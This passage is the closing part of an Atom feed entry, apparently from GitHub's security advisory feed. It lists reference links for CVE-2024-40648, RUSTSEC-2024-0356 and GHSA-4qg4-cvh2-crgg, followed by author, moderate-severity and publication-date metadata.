<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40648">https://nvd.nist.gov/vuln/detail/CVE-2024-40648</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0356.html">https://rustsec.org/advisories/RUSTSEC-2024-0356.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4qg4-cvh2-crgg">https://github.com/advisories/GHSA-4qg4-cvh2-crgg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4qg4-cvh2-crgg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T15:28:07.000Z</published>
    </entry>
</feed>